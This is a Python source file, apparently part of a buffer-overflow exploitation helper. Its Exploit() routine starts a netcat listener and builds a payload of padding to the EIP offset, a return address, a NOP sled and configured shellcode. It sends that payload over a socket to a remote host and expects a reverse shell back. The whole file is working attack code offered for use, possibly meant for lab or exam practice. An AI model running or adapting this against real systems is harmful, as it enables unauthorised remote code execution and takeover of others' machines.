import socket

from termcolor import colored

from BunnyBanners import BunnyBanners
from BunnyConfig import BunnyConfig
from BunnyEars import BunnyEars


class BunnyRun:
    @staticmethod
    def Exploit():
        BunnyBanners.PrintExploitBanner()

        run = input(
            "It is time to test our exploit. To do so, ensure the following:\n\n\t1: The vulnerable service is "
            "running outside of the debugger\n\t2: The vulnerable service has been run with administrator "
            "credentials\n\nWhat this has been done, press enter to run the exploit.")

        BunnyEars.StartNetCatListener()

        buffer1 = b"A" * BunnyConfig.eip_offset + bytes.fromhex(BunnyConfig.address.decode("utf-8").replace("\\x", ""))
        buffer2 = b"\x90" * 16
        buffer3 = bytes.fromhex(BunnyConfig.shellcode.decode("utf-8").replace("\\x", ""))

        sendBuffer = buffer1 + buffer2 + buffer3

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(BunnyConfig.socketTimeout)
        connect = s.connect((BunnyConfig.remote_ip, BunnyConfig.remote_port))

        s.send(BunnyConfig.operation + b" " + sendBuffer)
        s.close()

        input(colored("\n\nIf exploitation was successful, you should have recieved a connection from the target on our "
                      "netcat listener! Press enter to continue...", "green"))
